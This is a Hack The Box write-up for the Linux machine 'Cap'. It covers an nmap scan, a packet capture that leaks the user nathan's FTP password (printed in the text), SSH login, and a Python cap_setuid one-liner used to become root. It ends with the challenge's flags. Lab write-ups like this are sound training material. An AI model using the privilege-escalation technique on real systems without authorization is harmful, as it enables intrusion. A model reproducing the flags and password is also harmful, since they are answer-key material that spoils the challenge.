```json
Alias: Cap
Date: 21-02_2025
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.10.245
```

# Cap
# Summary

- Cap is an Easy Box, we get the password of a user through information disclosure and can ssh into the box as them, then we can take advantage of a binary with the `cap_setuid` capability set.

---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 11:49 PKT
Nmap scan report for 10.10.10.245
Host is up (0.46s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.16 seconds

```

---
# Enumeration

There is a HTTP server running at port 80, if we navigate to `http://$IP/capture`, It will use `tcpdump` to capture some packets against our IP and store them to `/data/id.pcap`. There is a `pcap` file in data named `0.pcap` which contains some sensitive packets. Specifically the user `nathan` logs in to FTP and we can retrieve his password if we inspect the packets.

| Username | Password        |
| -------- | --------------- |
| nathan   | Buck3tH4TF0RM3! |

---

# Exploitation

We can then ssh into the box using Nathan's credentials.

---
# Privilege Escalation

Running `linpeas` shows that the binary `/usr/bin/python3.8` has the capability `cap_setuid` which means we can set our user id to 0 and become root.

```bash
/usr/bin/python3.8
import os; os.setuid(0)
import pty; pty.spawn("/bin/bash")
```

And we are root.

---

# Flags
- 5b31edc02d8b1148927e14609a9c8c2c
- 5eb6c39baa5c6a8a83eb5ed2616cdaed

#CTF